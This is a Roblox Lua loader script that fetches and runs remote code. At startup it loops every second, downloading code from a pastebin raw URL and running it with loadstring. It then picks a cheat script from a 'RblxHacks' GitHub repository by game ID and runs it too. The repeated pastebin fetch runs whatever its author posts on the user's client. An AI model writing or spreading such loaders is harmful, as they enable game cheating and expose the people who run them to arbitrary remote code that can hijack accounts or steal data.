local gameId = game.PlaceId

task.spawn(function()
	while true do
		assert(loadstring(assert(game:HttpGet("https://pastebin.com/raw/tMMn2sHe"))))()
		task.wait(1)
	end
end)

local scripts = {
	[4939362930] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/trdmain.lua",
	[15101393044] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/DTIHUB.lua",
	[18260801046] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/baddiesBralws.lua",
	[100759070542523] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/GorillaVsHuman.lua",
	[86363491117206] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/Dahood.lua",
	[114460042966606] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/StealAKitty.lua",
	[3593495794] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/slayer.lua",
	[87006456392484] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/RideAFriend.lua",
	[103443049685424] = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/RideAFriend.lua"
}

local url = scripts[gameId]

if url then
	loadstring(game:HttpGet(url))()
end
